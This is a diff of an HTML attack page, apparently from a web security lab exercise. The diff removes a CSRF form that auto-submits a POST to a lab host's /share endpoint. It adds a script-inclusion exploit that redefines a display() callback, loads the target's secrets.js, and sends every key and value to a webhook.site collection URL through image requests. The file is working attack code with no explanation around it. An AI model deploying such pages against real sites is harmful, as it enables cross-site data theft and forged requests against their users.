@@ -1,17 +1,27 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello World</title>
+  <title>Malicious Page</title>
 </head>
 <body>
-    <form id="auto-submit-form" action="http://ptl-759d9f9d-96077b02.libcurl.so/share" method="POST">
-        <input type="hidden" name="user" value="test1">
-        <input type="hidden" name="id" value="0">
-    </form>
-    <script>
-        document.getElementById('auto-submit-form').submit();
-    </script>
+  <h1>Welcome to the Malicious Page</h1>
+  <p>If you see this, you might be at risk!</p>
+  
+  <script>
+    // Redefine the display function to send data to the attacker's server
+    function display(data) {
+      // Loop through the data and create an image tag to send the data to the attacker's server
+      for (var key in data) {
+        var img = new Image();
+        img.src = "https://webhook.site/4314bf30-5ce3-4919-a7ea-d88e77b2eb85/log?key=" + encodeURIComponent(key) + "&value=" + encodeURIComponent(data[key]);
+        document.body.appendChild(img);
+      }
+    }
+
+    // Make a request to the target JavaScript page to trigger the display function
+    var script = document.createElement("script");
+    script.src = "http://ptl-73680598-92c73aa8.libcurl.so/secrets.js";  // replace with the actual URL
+    document.body.appendChild(script);
+  </script>
 </body>
 </html>
